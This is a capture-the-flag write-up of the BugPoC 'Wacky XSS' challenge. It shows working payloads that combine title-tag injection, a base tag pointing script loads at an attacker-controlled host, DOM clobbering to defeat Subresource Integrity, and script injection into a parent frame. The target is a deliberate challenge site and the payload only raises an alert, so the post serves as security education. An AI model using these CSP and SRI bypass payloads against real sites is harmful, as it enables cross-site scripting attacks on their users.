---
layout: article
title:  "BugPoC Wacky XSS Challenge"
image: /assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png
categories: ctf
tags: [ctf, xss, nonce, sri, dom clobbering]
assets: /assets/bugpoc-wacky-xss-challenge/
---

*Bypassing CSP and SRI with HTML injection and DOM Clobbering*

<!--more-->

![Alert]({{page.assets}}wacky.buggywebsite.com_alert.png)

## TL;DR

The attack uses a few tricks that are pretty neat. For those of you who already
have a good understanding of the challenge, here are some key points:

* The attack works by using the `param` query parameter on
  `https://wacky.buggywebsite.com/frame.html` to inject a `<base>` tag between
the `<title>`tags. By doing so we're making the sandboxed iframe load the
`files/analytics/js/frame-analytics.js` file from our own server. It allows us
to bypass the CSP's nonce check and get an XSS inside the sandboxed iframe.

* The block on modal windows inside the sandboxed iframe is bypassed by using
  our XSS inside the sandboxed iframe, to inject an XSS inside its parent. This
is allowed because `allow-same-origin` is used in the sandboxed iframe, making
it share its parent's origin.

* Since we can't iframe `https://wacky.buggywebsite.com/frame.html`, we're
  opening it as a new window in an `onclick()` handler on our malicious page.
The (improper) check that makes sure the page is iframed is bypassed by setting
the name of the new window to `iframe`

* The `integrity` check on the `files/analytics/js/frame-analytics.js` script
  is bypassed using DOM clobbering. Our injected payload includes an `<input
name="fileIntegrity" value="...">` tag that sets `fileIntegrity.value` to the
sha256 of our own malicious javascript.

* The BugPoC PoC uses the the HTTP Front-end PoC. It also uses the Mock
  Endpoint to return the malicious `frame-analytics.js`, and the Flexible
Redirector to hide the mock endpoint's URL behind a tidy, path-free,
`<base>`-friendly URL

## Recon

The goal is to find an XSS on the web page below and pop an `alert(origin)`
that will show `https://wacky.buggywebsite.com/`:

![Wacky Text Generator]({{page.assets}}wacky.buggywebsite.com.png)

The web page is pretty simple: you enter a text, click the "Make Whacky!"
button, and the text is rendered using different fonts and shades of green for
each letter.

Right away we can notice that some sanitizing it done on the text area: when a
key is lifted the `&*<>%` characters are removed. This is done by the following
piece of code:

```js
document.getElementById("txt").onkeyup = function(){
    this.value = this.value.replace(/[&*<>%]/g, '');
};
```

The wacky text is in fact rendered in a different iframe whose `src` is updated
when the "Make Whacky!" button is pressed:

```js
document.getElementById('btn').onclick = function(){
    val = document.getElementById('txt').value;
    document.getElementById('theIframe').src = '/frame.html?param='+val;
};
```

We can see that the text to render is passed to the iframe through the `param`
query parameter, and it gets reflected in exactly two different locations
inside the iframe:

1. Between the `<title>` tags:
    ```html
    <title>
        qwerty
    </title>    
    ```

1. Inside a `<p>` section:
    ```html
    <div role="main">
        <p class="text" data-action="randomizr">qwerty</p>
    </div>
    ```

The text inside this `<p>` section is then rendered inside the iframe by the
following piece of code:

```js
function makeRandom(element) {
    for ( var i = 0; i < element.length; i++) {
        var createNewText = '';
        var htmlColorTag = 'color:';
        for ( var j = 0; j < element[i].textContent.length; j++ ) {
            var riFonts = randomInteger(fonts.length);
            var riColors = randomInteger(colors.length);
            createNewText = createNewText + "<span class='" + fonts[riFonts] + "' style='" + htmlColorTag + colors[riColors] + "'>" + element[i].textContent[j] + "</span>";
        }
        element[i].innerHTML = createNewText;
    }			  
}
var text = document.getElementsByClassName('text');
makeRandom(text);
```

The top document and the iframe are both returned with an `x-frame-options:
SAMEORIGIN` header, meaning we wouldn't be able to iframe either or these
inside our own page. This is important because it would have been a way to call
the iframe with a `param` of our choice.

Last but not least, both the top document and the iframe use the following CSP:

```
content-security-policy: script-src 'nonce-xxxxxxxxxxxx' 'strict-dynamic'
```

Since the nonce changes randomly with every request (as it should), it
basically means our only way to execute a payload is to insert it inside an
existing `<script>` tag.

## The Path to alert()


### Making an educated guess

The only query parameter we've found is `param` in the iframe's URL. Searching
through the response bodies shows no use of `location`, which mean it doesn't
seem there is any extraction of parameters from the URL on the client side. If
there is an XSS, it is almost certainly inside the iframe, through the `param`
query parameter.

This is pretty much confirmed by this piece of code inside the iframe:

```js
var g = window.alert;
window.alert = function(b) {
    g(b),
    g(atob("TmljZSBKb2Igd2l0aCB0aGlzIENURiEgSWYgeW91IGVuam95ZWQgaGFja2luZyB0aGlzIHdlYnNpdGUgdGhlbiB5b3Ugd291bGQgbG92ZSBiZWluZyBhbiBBbWF6b24gU2VjdXJpdHkgRW5naW5lZXIhIEFtYXpvbiB3YXMga2luZCBlbm91Z2ggdG8gc3BvbnNvciBCdWdQb0Mgc28gd2UgY291bGQgbWFrZSB0aGlzIGNoYWxsZW5nZS4gUGxlYXNlIGNoZWNrIG91dCB0aGVpciBqb2Igb3BlbmluZ3Mh"))
}
```

It redefines the `alert()` function to pop the alert as expected, and then pop
a second alert with the following message:

> Nice Job with this CTF! If you enjoyed hacking this website then you would
> love being an Amazon Security Engineer! Amazon was kind enough to sponsor
> BugPoC so we could make this challenge. Please check out their job openings!

So, the XSS will happen inside the `https://wacky.buggywebsite.com/frame.html`
iframe for sure, and probably through the `param` query parameter.

### Controlling the iframe

We've seen that we can't iframe `https://wacky.buggywebsite.com/frame.html`
inside our own page, because of the `x-frame-options: SAMEORIGIN` header. But
then how could we get our victim to open it with our payload in the `param`
query parameter?

Simple, let's just call `window.open()` instead, and open the frame in a new
tab.

Well it doesn't work, because of this piece of code:

```js
// verify we are in an iframe
if (window.name == 'iframe') {
    [...]
} else {
    document.body.innerHTML = `
    <h1>Error</h1>
    <h2>This page can only be viewed from an iframe.</h2>
    <video width="400" controls>
    <source src="movie.mp4" type="video/mp4">
    </video>`
}
```

Fortunately for us this is not a proper way to check if we're in an iframe. We
can just fake it by setting the name of the new window to "iframe". Our
malicious page would look like:

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script>
function popup() {
    var payload = encodeURIComponent(
        'My payload'
    );
    window.open('https://wacky.buggywebsite.com/frame.html?param=' + payload,
                'iframe'); // Sets name to "iframe" in the new window
}
</script>
</head>
<body>
<a href="#" onclick="popup()">Click me!</a>
</body>
</html>
```

We make sure to call `window.open()` in an `onclick()` handler, because if the
popup doesn't result from a click then it would be blocked by default.

### CSP Bypass

Out of the two injection points we've found, only the first one, between the
`<title>` tags, is not escaped. Normally we could just close the `<title>` tag
and inject our script there. However, because the CSP requires a nonce that we
don't know, the execution is blocked as we can see in the console:

```js
function popup() {
    var payload = encodeURIComponent(
        '</title><script>alert(origin)</script>'
    );
    window.open('https://wacky.buggywebsite.com/frame.html?param=' + payload,
                'iframe');
}
```
![CSP]({{page.assets}}wacky.buggywebsite.com_CSP.png)

Lucky for us, the `https://wacky.buggywebsite.com/frame.html` page also creates
a sandboxed iframe. This iframe loads a script from a relative location:

```js
script = document.createElement('script');
script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
[...]
analyticsFrame.contentDocument.body.appendChild(script);
```

Instead of injecting a `<script>` we can inject a `<base
href="https://evil.com/">`. All URLs that don't specify a host will be relative
to this base URL, and the script will be loaded from
`https://evil.com/files/analytics/js/frame-analytics.js`.

We also need to make sure our `frame-analytics.js` file is returned with an
`Access-Control-Allow-Origin: *` header. This is, I believe, because the
`<script>` tag has `crossorigin` set to `anonymous`.

### SRI Bypass

With our new payload we're now faced with another issue:

```js
function popup() {
    var payload = encodeURIComponent(
        '</title><base href="https://acut3.xyz/">'
    );
    window.open('https://wacky.buggywebsite.com/frame.html?param=' + payload,
                'iframe');
}
```

![CSP]({{page.assets}}wacky.buggywebsite.com_integrity.png)

The `<script>` element is created with an `integrity` attribute. It's a feature
known as "Sub-resource Integrity" that instructs the browser to check that the
signature of the downloaded script matches the signatures declared in the
attribute.

Since we don't have any way to make our script's sha256 match the expected
value of `unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=`, we need to a way to
change this expected value. Where does this value come from? It is set with the
following piece of code:

```js
window.fileIntegrity = window.fileIntegrity || {
    'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
    'algorithm' : 'sha256',
    'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
    'creationtime' : 1602687229
}
[...]
script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
```

If `window.fileIntegrity` is already set when the script executes, it won't be
overridden. But how could we set it without an XSS? Through DOM Clobbering!
Since we can inject arbitrary tags, we can inject an `<input>` tag:

```html
<input id="fileIntegrity" value="<our_sha256>">
```

It will have the effect of setting `fileIntegrity.value` to the sha256 of our
malicious `frame-analytics.js` file.

### Modal Block Bypass

Let's create our file
`https://acut3.xyz/files/analytics/js/frame-analytics.js`:

```
$ curl -gsi 'https://acut3.xyz/files/analytics/js/frame-analytics.js'
HTTP/2 200
[...]
access-control-allow-origin: *
content-type: application/javascript

alert(origin)
```

```
$ curl -s 'https://acut3.xyz/files/analytics/js/frame-analytics.js' \
       | openssl sha256 -binary | base64
5gW1KquRtb9p81d6nfzjy+RXY/+o5QNprR3LJ4hhyMM=
```

```js
function popup() {
    var payload = encodeURIComponent(
        '</title>'
        + '<script>alert(origin)</script>'
        + '<input hidden id="22fileIntegrity" value="5gW1KquRtb9p81d6nfzjy+RXY/+o5QNprR3LJ4hhyMM=">'
    );
    window.open('https://wacky.buggywebsite.com/frame.html?param=' + payload,
                'iframe');
}
```

We're faced with yet another issue:

![CSP]({{page.assets}}wacky.buggywebsite.com_modal.png)

Because our XSS is executing inside a sandboxed iframe that doesn't have
`allow-modals` option, we're not allowed call `alert()`.

Instead of calling `alert()` inside the sandboxed iframe, we can inject a
script into the parent window. This is allowed because the sandboxed iframe has
the `allow-same-origin` option set, which means it has its normal origin
(without it, it would have a special origin that doesn't match any other
origin). In this case the origin is the same as the parent window since the
iframe doesn't have an `src` attribute.

Our `frame-analytics.js` file becomes:

```js
xss = document.createElement("script");
xss.textContent = "alert(origin)";
parent.document.body.appendChild(xss);
```

Note that we don't need to set a nonce, presumably because the script is being
created by a "trusted" script. But if needed it would be easy to set a valid
nonce with:

```js
xss.nonce = parent.document.scripts[0].nonce
```

### Final PoC

We simply need to host those two web pages:

1. https://acut3.xyz/files/analytics/js/frame-analytics.js:

   ```js
xss = document.createElement("script");
xss.textContent = "alert(origin)";
parent.document.body.appendChild(xss);
   ```

   Returned with the required header:

   ```http
   Access-Control-Allow-Origin: *
   ```

1. The main page:

   ```html
   <!DOCTYPE html>
   <html>
   <head>
   <meta charset="utf-8">
   <script>
   function popup() {
       var payload = encodeURIComponent(
           '</title>'
           + '<base href="https://acut3.xyz/">'
           + '<input hidden id="fileIntegrity" value="8rWlnRQdot2DeuCE0IKb7kw4BhGMRbQeOITSE876IQs=">'
       );
       window.open('https://wacky.buggywebsite.com/frame.html?param=' + payload,
                   'iframe'); // Sets name to "iframe" in the new window
   }
   </script>
   </head>
   <body>
   <a href="#" onclick="popup()">Click me!</a>
   </body>
   </html>
   ```

The victim needs to visit our page and click on the "Click me!" link. An alert
will pop in the new tab.

## BugPoC PoC

First we need to create a [mock
endpoint](https://bugpoc.com/testers/other/mock) that will return the fake
`frame-analytics.js` file:

![Mock Endpoint Builder]({{page.assets}}bugpoc.com_testers_other_mock.png)

The [generated URL](https://mock.bugpoc.ninja/bf96c4ce-ab42-4d47-aa3e-4d45d70ae2d9/m?sig=1d02918cec44299d3fc73268614e9cb5fe2d8243d3bce1a894b886e4d6d77948&statusCode=200&headers=%7B%22access-control-allow-origin%22%3A%22*%22%7D&body=xss%20%3D%20document.createElement(%22script%22)%3B%0Axss.textContent%20%3D%20%22alert(origin)%22%3B%0Aparent.document.body.appendChild(xss)%3B) cannot be used as a `<base>` URL since it ends with a non-directory element. Let's use the new [flexible redirector](https://bugpoc.com/testers/other/redir) to hide it behind a clean, `<base>`-friendly URL:

![Flexible Redirector]({{page.assets}}bugpoc.com_testers_other_redir.png)

Compute the sha256 of this page (don't forget curl's `-L` to follow
redirections):

```sh
$ curl -Ls 'https://zkkmxeqw4y9n.redir.bugpoc.ninja' \
       | openssl sha256 -binary | base64
uab6g00HfZC79E8L0usyN5QQ01OnnzuP+RYY1jUfu7o=
```

Now the generated URL
[https://zkkmxeqw4y9n.redir.bugpoc.ninja](https://zkkmxeqw4y9n.redir.bugpoc.ninja)
can be used to build the final [Front-End
PoC](https://bugpoc.com/testers/front-end):

![Front-End PoC Generator]({{page.assets}}bugpoc.com_testers_front-end.png)

Click on "Publish" and share the [PoC URL](https://bugpoc.com/poc#bp-lMrf4j3L)
and password in you HackerOne report:

![Front-End PoC Published]({{page.assets}}bugpoc.com_testers_published.png)

## Final thoughts

I must say I enjoyed this challenge very much. It had all the attributes that,
in my opinion, make a good challenge:

- No guesswork, just logical thinking
- Realistic vulnerabilities that you could find in a real world scenario
- Some lesser knows techniques that I'm sure were new to many participants

To summarize the different techniques that we used:

- Use `open()` when iframing is not possible
- Inject a `<base>` tag to replace an existing script and bypass a nonce
- Use DOM Clobbering to set a variable and alter the flow of an an existing
  script
- Once you have an XSS, everything with the same origin is in reach

Also something quite unique about this challenge: it serves as the first
interview for select Amazon Security Engineering roles, should you choose to
apply for them. Pretty cool! While I'm not personally looking for a job, I hope
others will have seized the opportunity and that something good will come out
of it.

* * *
